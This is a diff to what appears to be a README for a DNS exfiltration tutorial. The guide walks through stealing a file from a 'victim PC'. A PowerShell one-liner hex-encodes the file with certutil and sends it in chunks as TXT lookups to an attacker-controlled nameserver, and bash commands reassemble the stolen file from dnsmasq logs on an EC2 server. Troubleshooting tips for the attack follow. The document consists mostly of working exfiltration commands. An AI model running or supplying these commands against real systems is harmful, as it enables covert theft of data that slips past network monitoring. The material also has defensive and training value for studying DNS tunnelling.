@@ -90,7 +90,7 @@ Launch cmd prompt on victim PC then run the command below
 
 
 ## Step 11: Check your DNS logs in EC2
-In EC2 DNS server, run the command below and observe your nslookup query being logged.
+In EC2 DNS server, run the command below and observe your nslookup query being logged.  
 `sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"`  
 
 
@@ -100,10 +100,33 @@ Launch powershell prompt on victim PC then run command below.
 `cd <to folder holding file to exfiltrate>`  
 `certutil -encodehex <file to exfiltrate> encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `
 
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/2624b595-5ce0-423b-901b-8702de5a99c2)
+  
 
 ## Step 13: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 In EC2 DNS server, run the commands below to combine assemble hex into file.  
 
-`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
-`sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  
+`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 6 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
+`sudo cat output | xxd -p -r > <file to exfiltrate from Step 12> && cat <file to exfiltrate from Step 12>`  
 
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/c18d73f6-f166-4f47-aaa0-dc4a479cd2b3)
+
+## Troubleshooting Tips:  
+  
+### Step 10, nameserver issue
+In Step 10, sometimes you need to specify nameserver (ns1.<yourdomain.com>) in the nslookup command, sometimes you don't. I'm unsure why that is so.  
+Remove or add nameservers as needed according to what you experience.  
+You'll also need to remove or add nameservers from the command in Step 12!  
+  
+### Step 11, clearing logs
+After some tests you might want to clear your logs. Use the command below:  
+`sudo nano /var/log.dnsmasq.log`  
+In nano, press `Alt + T` to clear everything in the log file  
+Press `Ctrl + X` to save  
+
+### Step 13, blank file output
+There may be rare occasions where your output file is blank. Troubleshoot with commands below:  
+  
+Check that you're "cutting" correctly from the dnsmasq log using `sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 6 -d ' ' `.  
+  
+Adjust "-f 6" to "-f 5" or "-f 7" to change where to cut the log. Once you get the right spot, modify cut command accordingly.
